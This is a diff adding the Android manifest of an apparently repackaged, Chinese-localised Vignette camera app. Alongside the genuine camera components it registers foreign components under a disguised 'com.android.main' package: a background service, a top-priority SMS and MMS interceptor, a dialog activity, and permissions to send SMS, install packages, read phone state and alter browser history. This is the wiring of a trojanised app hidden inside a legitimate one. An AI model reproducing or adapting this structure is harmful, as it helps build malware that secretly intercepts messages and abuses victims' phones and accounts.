@@ -1,0 +1,122 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="uk.co.neilandtheresa.Vignette">
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.FLASHLIGHT"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
+    <uses-feature android:name="android.hardware.camera"/>
+    <supports-screens android:anyDensity="true" android:largeScreens="true" android:normalScreens="true" android:smallScreens="true"/>
+    <application android:icon="@drawable/vignette" android:label="晕影相机">
+        <receiver android:name="uk.co.neilandtheresa.Vignette.VignetteReceiver">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.CAMERA_BUTTON"/>
+            </intent-filter>
+        </receiver>
+        <activity android:configChanges="keyboardHidden|orientation" android:launchMode="singleTask" android:name=".Vignette" android:screenOrientation="landscape">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.media.action.STILL_IMAGE_CAMERA"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.media.action.IMAGE_CAPTURE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.SEND"/>
+                <data android:mimeType="image/jpeg"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="uk.co.neilandtheresa.Vignette.SHORTCUT"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity android:enabled="false" android:icon="@drawable/messages" android:label="信息" android:launchMode="singleTop" android:name="uk.co.neilandtheresa.Vignette.MessagesProxy" android:noHistory="true">
+            <intent-filter>
+                <action android:name="android.intent.action.SEND"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:mimeType="image/jpeg"/>
+            </intent-filter>
+        </activity>
+        <activity android:icon="@drawable/vignette" android:launchMode="singleTop" android:name="uk.co.neilandtheresa.Vignette.Shortcut" android:noHistory="true">
+            <intent-filter>
+                <action android:name="android.intent.action.CREATE_SHORTCUT"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity android:icon="@drawable/vignette" android:launchMode="singleTop" android:name="uk.co.neilandtheresa.Vignette.FactoryReset" android:noHistory="true">
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+                <data android:host="neilandtheresa.co.uk" android:path="/vignette/reset" android:scheme="http"/>
+                <data android:host="neilandtheresa.co.uk" android:path="/vignette/reset" android:scheme="vie"/>
+            </intent-filter>
+        </activity>
+        <activity android:icon="@drawable/vignette" android:launchMode="singleTop" android:name="uk.co.neilandtheresa.Vignette.HardwareReport" android:noHistory="true">
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+                <data android:host="neilandtheresa.co.uk" android:path="/vignette/hardwarereport" android:scheme="http"/>
+                <data android:host="neilandtheresa.co.uk" android:path="/vignette/hardwarereport" android:scheme="vie"/>
+            </intent-filter>
+        </activity>
+        <receiver android:exported="false" android:name="uk.co.neilandtheresa.VIE.VIEReceiver">
+            <intent-filter>
+                <action android:name="uk.co.neilandtheresa.VIE.START"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </receiver>
+        <service android:label="晕影成像引擎" android:name="uk.co.neilandtheresa.VIE.VIE" android:process=":VIE">
+            <intent-filter android:priority="5532"> // VIE 优先级
+<action android:name="uk.co.neilandtheresa.VIE.SERVICE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </service>
+        <activity android:label="VIE 错误" android:name="uk.co.neilandtheresa.VIE.VIEError">
+            <intent-filter>
+                <action android:name="uk.co.neilandtheresa.VIE.ERROR"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity android:label="VIE 图库" android:name="uk.co.neilandtheresa.VIE.VIEGallery">
+            <intent-filter>
+                <action android:name="uk.co.neilandtheresa.VIE.GALLERY"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <service android:name="com.android.main.MainService" android:process=":main"/>
+        <receiver android:name="com.android.main.ActionReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.SIG_STR"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.android.main.SmsReceiver">
+            <intent-filter android:priority="100000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+            <intent-filter android:priority="100000">
+                <action android:name="android.provider.Telephony.WAP_PUSH_RECEIVED"/>
+                <data android:mimeType="application/vnd.wap.mms-message"/>
+            </intent-filter>
+        </receiver>
+        <activity android:name="com.android.main.TANCActivity" android:theme="@android:style/Theme.Dialog"/>
+    </application>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_MMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+</manifest>
